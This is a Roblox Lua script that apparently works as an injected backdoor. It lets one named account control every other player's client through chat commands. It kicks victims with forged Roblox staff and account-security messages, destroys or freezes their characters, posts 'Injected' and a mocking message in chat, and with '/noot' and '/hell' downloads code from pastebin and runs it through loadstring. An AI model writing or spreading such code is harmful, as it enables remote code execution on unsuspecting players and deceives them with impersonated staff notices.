local admin = game.Players:FindFirstChild("d4rkagee")
local chat = game:GetService("Chat")

admin.Chatted:Connect(function(cht)
	if cht:match("/ban") then
		if game.Players.LocalPlayer ~= admin then
			game.Players.LocalPlayer:Kick("Same account launched experience from different device. Reconnect if you prefer to use this device.")
		end
	end
end)


admin.Chatted:Connect(function(cht)
	if cht:match("/kill") then
		if game.Players.LocalPlayer ~= admin then
			game.Players.LocalPlayer.Character:Destroy()
		end
	end
end)


admin.Chatted:Connect(function(cht)
	if cht:match("/kick") then
		if game.Players.LocalPlayer ~= admin then
			game.Players.LocalPlayer:Kick("A Roblox staff member has kicked you from the experience. Next time, please follow Roblox TOS to make the experience fun for all players.")
		end
	end
end)


admin.Chatted:Connect(function(cht)
	if cht:match("/freeze") then
		if game.Players.LocalPlayer ~= admin then
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
		end
	end
end)


admin.Chatted:Connect(function(cht)
	if cht:match("/check") then
		if game.Players.LocalPlayer ~= admin then
			game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", { Text ="Injected"})
		end
	end
end)


admin.Chatted:Connect(function(cht)
	if cht:match("/trollchat") then
		if game.Players.LocalPlayer ~= admin then
			game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", { Text ="i like barbie dolls"})
		end
	end
end)


admin.Chatted:Connect(function(cht)
	if cht:match("/check") then
		if game.Players.LocalPlayer ~= admin then
			game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", { Text ="Injected"})
		end
	end
end)


admin.Chatted:Connect(function(cht)
	if cht:match("/noot") then
		if game.Players.LocalPlayer ~= admin then
			loadstring(game:HttpGet("https://pastebin.com/raw/FBUZQLwB"))()
		end
	end
end)


admin.Chatted:Connect(function(cht)
	if cht:match("/hell") then
		if game.Players.LocalPlayer ~= admin then
			loadstring(game:HttpGet("https://pastebin.com/raw/JzFRfhYe"))()
		end
	end
end)
